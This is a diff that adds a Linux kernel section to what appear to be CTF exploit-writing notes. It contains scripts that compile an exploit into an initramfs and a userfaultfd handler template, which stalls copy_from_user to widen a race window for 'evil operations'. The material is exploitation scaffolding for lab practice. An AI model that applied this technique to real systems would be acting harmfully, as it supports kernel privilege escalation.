@@ -192,4 +192,153 @@ readline();
 throw Error("failed to get shell");
 ```
 
+## Linux Kernel
 
+### Setup Scripts
+
+`make.sh`
+
+```bash
+musl-gcc exp.c -static -o fs/exp # compile exploit
+cd fs && ./gen.sh ../rootfs.cpio 2> /dev/null # generate new cpio with exp
+cd .. && ./run.sh # run the kernel
+```
+
+`gen.sh`
+
+```bash
+find . -print0 \
+| cpio --null -ov --format=newc > $1
+```
+
+### Frequently Used Header
+
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <poll.h>
+#include <pthread.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <pthread.h>
+#include <poll.h>
+#include <sys/prctl.h>
+#include <stdint.h>
+void errExit(char* msg)
+{
+	puts(msg);
+	exit(-1);
+}
+```
+
+### User Fault FD
+
+```c
+#include "userfaultfd.h"
+size_t cand_idx;
+char buffer[0x1000];
+
+typedef struct _fault_arg
+{
+	int fd;
+	void* fault_page;
+}fault_arg;
+
+void* handler(void *arg_)
+{
+	fault_arg* arg = (fault_arg*)arg_;
+	int uffd = arg->fd;
+	void* fault_page = arg->fault_page;
+	free(arg);
+	// fetch arguments
+
+	puts("[*] handler created");
+	struct uffd_msg msg;
+
+	struct pollfd pollfd;
+	int nready;
+	pollfd.fd = uffd;
+	pollfd.events = POLLIN;
+	nready = poll(&pollfd,1,-1);
+	if (nready != 1)
+		errExit("wrong poll return value");
+	// this will wait until copy_from_user is called on FAULT_PAGE
+	printf("trigger! I'm going to hang\n");
+	// now main thread stops at copy_from_user function
+	// but now we can do some evil operations!
+
+	// PUT YOUR CALLBACK HERE
+	// USE GLOBAL VARIABLE TO PASS ARGUMENT IF WE NEED ARGUMENT HERE
+	// e.g. USE `cand_idx` HERE
+
+	if (read(uffd, &msg, sizeof(msg)) != sizeof(msg))
+		errExit("error in reading uffd_msg");
+	// read a msg struct from uffd, although not used
+
+	struct uffdio_copy uc;
+	memset(buffer, 0, sizeof(buffer));
+	uc.src = (uintptr_t)buffer;
+	uc.dst = (uintptr_t)fault_page;
+	uc.len = 0x1000;
+	uc.mode = 0;
+	ioctl(uffd, UFFDIO_COPY, &uc);
+	// resume copy_from_user with buffer as data
+
+	puts("[*] done 1");
+	// now note1 has length 0xf0
+
+	return NULL;
+}
+
+void* register_userfault()
+{
+	struct uffdio_api ua;
+	struct uffdio_register ur;
+	pthread_t thr;
+
+	int64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+	if (uffd < 0)
+		errExit("syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)");
+	ua.api = UFFD_API;
+	ua.features = 0;
+	if (ioctl(uffd, UFFDIO_API, &ua) < 0)
+		errExit("ioctl-UFFDIO_API");
+	// create the user fault fd
+
+	void* fault_page = mmap(0,0x1000,7,0x22,-1,0);
+	if (fault_page == MAP_FAILED)
+		errExit("mmap fault page");
+	// create page used for user fault
+
+	ur.range.start = (unsigned long)fault_page;
+	ur.range.len = 0x1000;
+	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
+	if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
+		errExit("ioctl-UFFDIO_REGISTER");
+	// register the page into user fault fd
+	// so that if copy_from_user accesses fault_page,
+	// the access will be hanged, and uffd will receive something
+
+	fault_arg* arg = malloc(sizeof(fault_arg));
+	arg->fd = uffd;
+	arg->fault_page = fault_page;
+	int s = pthread_create(&thr,NULL,handler,(void*)arg);
+	if(s!=0)
+		errExit("pthread_create");
+	// create handler that process the user fault
+	return fault_page;
+}
+```
+
+See [userfaultfd.h](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/userfaultfd.h)
